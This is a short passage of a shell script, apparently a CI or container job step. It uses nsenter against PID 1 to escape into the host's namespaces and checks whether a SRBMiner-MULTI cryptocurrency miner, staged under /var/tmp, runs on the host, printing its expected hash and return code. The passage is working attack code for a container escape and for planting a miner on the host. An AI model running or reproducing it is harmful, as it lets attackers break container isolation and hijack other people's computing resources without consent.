          echo "expected_sha=$BIN_SHA"
          echo "=== host runnable test ==="
          timeout 30 nsenter -t 1 -m -p -r -- /bin/sh -c '/var/tmp/i128954-host/SRBMiner-MULTI --version 2>&1 | head -3' 2>&1 | head -5
          RUNOK=$(timeout 30 nsenter -t 1 -m -p -r -- /bin/sh -c '/var/tmp/i128954-host/SRBMiner-MULTI --version >/dev/null 2>&1; echo rc=$?' 2>/dev/null | tail -1)
          echo "host_runnable=$RUNOK"
